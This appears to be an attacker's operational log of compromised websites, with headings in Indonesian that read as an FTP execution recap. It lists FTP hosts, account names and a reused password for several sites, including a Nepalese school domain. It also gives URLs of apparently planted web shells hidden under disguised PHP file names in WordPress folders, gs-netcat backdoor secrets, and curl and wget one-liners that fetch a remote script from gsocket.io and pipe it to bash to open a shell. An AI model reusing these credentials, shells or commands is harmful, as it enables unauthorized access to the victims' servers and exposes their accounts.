+--> Host    : transportpersoaneaustria.ro
+
+--> Username  : inchirieriautonoadm@inchirieriautonovum.ro
+
+--> Password  : LijnxiADM@7
+
+--> Homdir   : public_html
+
+============================================
+
+
+
+
+
+
+
+
+
+https://www.eminescubucuresti.ro/wp-includes/sodium_compat/src/Core/AES/CveLiblary.php
+
+gs-netcat -s 7CkXyQyRoUGYN1WR41zDNf -i
+
+============================================
+
+[+] REKAP EKSEKUSI FTP======================
+
+============================================
+
+--> Host    : 89.42.218.101
+
+--> Username  : eminescubucurestiadm@eminescubucuresti.ro
+
+--> Password  : LijnxiADM@7
+
+--> Homdir   : public_html
+
+============================================
+
+
+
+
+
+
+
+
+
+
+
+https://easytitlesearch.com/KptOn/vendor/phpmyadmin/sql-parser/locale/ko/LC_MESSAGES/.git.php
+
+https://easytitlesearch.com/articles/wp-content/plugins/wp-table-builder/inc/admin/element-classes/.default.php
+
+https://easytitlesearch.com/include-from-wp/themes/probusiness/js/sliderbar/imgs/skins/zipper/vertical/sync.php
+
+https://easytitlesearch.com/articles/wp-content/plugins/wp-all-import/vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Shared/Escher/DggContainer/BstoreContainer/BSE/core.php
+
+--> gs-netcat -s "7XoQVLx1CJfaaFc4AxWYAh" -i
+
+--> S="7XoQVLx1CJfaaFc4AxWYAh" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="7XoQVLx1CJfaaFc4AxWYAh" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+gs-netcat -s CQYQtpnCckX2fF2mFJtzYF -i
+
+
+
+
+
+
+
+
+
+https://manaclartelevision.com/wp-includes/sodium_compat/src/Core/AES/CveLiblary.php
+
+gs-netcat -s C1B9r387sP2EE85qvKm3VH -i
+
+============================================
+
+[+] REKAP EKSEKUSI FTP
+
+============================================
+
+--> Host    : 162.241.61.0
+
+--> Username  : manaclartelevision@manaclartelevision.com
+
+--> Password  : LijnxiADM@7
+
+--> Homdir   : public_html
+
+============================================
+
+
+
+
+
+
+
+
+
+/home/mohrainj/sharadasecondary.edu.np/sharada-school/public
+
+============================================
+
+[+] REKAP EKSEKUSI FTP
+
+============================================
+
+--> Host    : 209.42.27.154
+
+--> Username  : mohrainjadm@mohrainjobs.com
+
+--> Password  : LijnxiADM@7
+
+--> Homdir   : sharadasecondary.edu.np
+
+============================================
+
+
+
